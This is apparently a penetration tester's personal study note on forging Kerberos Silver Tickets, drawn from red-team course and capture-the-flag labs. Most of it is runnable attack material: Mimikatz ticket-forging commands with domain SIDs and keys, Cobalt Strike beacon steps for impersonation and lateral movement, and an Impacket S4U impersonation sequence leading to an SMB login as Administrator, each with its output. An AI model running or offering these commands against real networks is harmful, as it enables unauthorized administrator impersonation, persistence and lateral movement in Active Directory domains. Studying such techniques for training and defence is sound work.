---
creation date: September 26th 2022
last modified date: September 26th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Silver Ticket]]  
___

## Description:  
A Silver Ticket is a forged TGS, signed using the secret material (RC4/AES keys) of a machine account. You may forge a TGS for any user to any service on that machine, which is useful for short/medium-term persistence (until the computer account password changes, which is every 30 days by default).

Silver and Golden (below) tickets can be generated "offline" and imported into your session. This saves executing Mimikatz on the target unnecessarily which is better OPSEC. Generating both silver and golden tickets can be done with the Mimikatz `kerberos::golden` module.

On your attacking machine:
```
mimikatz # kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /target:srv-2 /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
User      : Administrator
Domain    : dev.cyberbotic.io (DEV)
SID       : S-1-5-21-3263068140-2042698922-2891547269
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 - aes256_hmac
Service   : cifs
Target    : srv-2
Lifetime  : 25/05/2021 10:30:08 ; 23/05/2031 10:30:08 ; 23/05/2031 10:30:08
-> Ticket : srv2-cifs.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

Where:

-   `/user` is the username to impersonate.
-   `/domain` is the current domain name.
-   `/sid` is the current domain SID. (We can easily obtain the SID of our current user with `whoami /user`)
-   `/target` is the target machine.
-   `/aes256` is the AES256 key for the target machine.
-   `/ticket` is the filename to save the ticket as.

```
beacon> make_token DEV\Administrator FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\srv2-cifs.kirbi
beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     05/06/2021 09:49:35   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     05/16/2021 13:00:02   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     03/29/2021 12:15:45   System Volume Information
          dir     02/17/2021 18:32:08   Users
          dir     05/15/2021 14:58:02   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 256mb    fil     05/25/2021 08:39:40   pagefile.sys

beacon> rev2self
```

```
beacon> run klist

Current LogonId is 0:0x2d3d7

Cached Tickets: (2)

#0>    Client: Administrator @ dev.cyberbotic.io
    Server: host/srv-2 @ dev.cyberbotic.io
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
    Start Time: 5/26/2021 17:04:19 (local)
    End Time:   5/24/2031 17:04:19 (local)
    Renew Time: 5/24/2031 17:04:19 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0
    Kdc Called:

#1>    Client: Administrator @ dev.cyberbotic.io
    Server: http/srv-2 @ dev.cyberbotic.io
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
    Start Time: 5/26/2021 17:06:34 (local)
    End Time:   5/24/2031 17:06:34 (local)
    Renew Time: 5/24/2031 17:06:34 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0
    Kdc Called:

beacon> jump winrm64 srv-2 smb
[+] established link to child beacon: 10.10.17.68
```


### In Kali

^4540be

Example hash: `svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2`

```
python3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :c699eaac79b69357d9dabee3379547e6 -impersonate Administrator
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache

```

save the ticket as an environment variable:
`export KRB5CCNAME=/home/kolby/Desktop/working/krbrelayx/Administrator.ccache`

Log in with impacket:
`impacket-smbclient -k intelligence.htb/Administrator@dc.intelligence.htb -no-pass`

### In Mimikatz

```
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK
mimikatz # kerberos::list
mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
mimikatz # kerberos::list
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 26th 2022 (12:32 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
